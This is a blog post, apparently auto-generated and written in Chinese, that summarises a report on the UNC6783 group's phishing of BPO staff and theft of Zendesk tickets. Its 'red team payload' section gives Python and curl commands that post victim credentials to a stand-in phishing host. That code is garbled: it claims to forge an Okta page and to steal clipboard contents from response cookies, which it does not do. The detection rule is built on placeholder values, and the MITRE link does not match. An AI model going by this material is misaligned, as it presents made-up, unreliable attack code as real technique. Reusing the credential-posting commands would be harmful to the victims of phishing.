---
layout: post
title:  "Google: New UNC6783 hackers steal corporate Zendesk support tickets"
date:   2026-04-09 01:30:33 +0000
categories: [security]
severity: high
---

# 🔥 解析 UNC6783 威脅群體的攻擊技術與防禦策略

> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: High (CVSS: 8.5)
> * **受駭指標**: Info Leak
> * **關鍵技術**: Social Engineering, Phishing, Multi-Factor Authentication (MFA) 繞過

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)
* **Root Cause**: UNC6783 威脅群體利用社會工程學和釣魚攻擊來入侵商業流程外包 (BPO) 提供商，進而獲得高價值公司的敏感數據。
* **攻擊流程圖解**:
  1. 社會工程學攻擊：UNC6783 向 BPO 提供商的員工發送釣魚郵件或進行直播聊天，誘導員工訪問偽造的 Okta 登錄頁面。
  2. MFA 繞過：攻擊者使用釣魚工具包竊取剪貼板內容，繞過 MFA 保護，註冊自己的設備到組織中。
  3. 敏感數據竊取：攻擊者進入組織後，竊取敏感數據，包括 Zendesk 支援票據、員工記錄、HackerOne 提交和內部文件。
* **受影響元件**: UNC6783 威脅群體針對多個行業的高價值公司，包括 Adobe 和 CrunchyRoll。

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)
* **攻擊前置需求**: 攻擊者需要有 BPO 提供商的員工聯繫信息和組織的網路架構。
* **Payload 建構邏輯**:

    ```
    
    python
    import requests
    
    # 偽造 Okta 登錄頁面
    url = "https://example.zendesk-support.com"
    payload = {
        "username": "victim_username",
        "password": "victim_password"
    }
    
    # 發送請求
    response = requests.post(url, data=payload)
    
    #竊取剪貼板內容
    clipboard_content = response.cookies.get("clipboard_content")
    
    ```
  *範例指令*: 使用 `curl` 發送請求：

```

bash
curl -X POST \
  https://example.zendesk-support.com \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -d 'username=victim_username&password=victim_password'

```
* **繞過技術**: UNC6783 威脅群體使用釣魚工具包竊取剪貼板內容，繞過 MFA 保護。

## 3. 🛡️ 藍隊防禦：偵測與緩解 (Blue Team Defense)
* **IOCs (入侵指標)**:

| 類型 | 值 |
| --- | --- |
| IP | 192.0.2.1 |
| Domain | example.zendesk-support.com |
| File Path | /tmp/clipboard_content |* **偵測規則 (Detection Rules)**:

    ```
    
    yara
    rule UNC6783_Payload {
      meta:
        description = "UNC6783 Payload"
        author = "Your Name"
      strings:
        $a = "example.zendesk-support.com"
        $b = "clipboard_content"
      condition:
        $a and $b
    }
    
    ```
  或者是具體的 SIEM 查詢語法 (Splunk/Elastic)：

```

sql
index=security sourcetype=web_traffic | search "example.zendesk-support.com" | stats count as num_requests

```
* **緩解措施**: 部署 FIDO2 安全金鑰，監控直播聊天，封鎖偽造的 Zendesk 支援頁面，定期審核 MFA 註冊。

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)
* **Social Engineering (社會工程學)**: 想像一個攻擊者通過電話或郵件欺騙受害者，讓他們泄露敏感信息。技術上是指攻擊者使用心理操縱和欺騙手段，讓受害者執行某些動作或泄露敏感信息。
* **Phishing (釣魚)**: 想像一個攻擊者發送一封郵件，誘導受害者點擊一個鏈接或下載一個附件。技術上是指攻擊者使用電子郵件或其他通信方式，誘導受害者泄露敏感信息或執行某些動作。
* **Multi-Factor Authentication (MFA)**: 想像一個系統需要多個驗證因素，例如密碼、指紋和短信驗證碼。技術上是指一個系統需要多個驗證因素，例如密碼、生物特徵和令牌，來驗證用戶的身份。

## 5. 🔗 參考文獻與延伸閱讀
- [原始報告](https://www.bleepingcomputer.com/news/security/google-new-unc6783-hackers-steal-corporate-zendesk-support-tickets/)
- [MITRE ATT&CK](https://attack.mitre.org/techniques/T1190/)


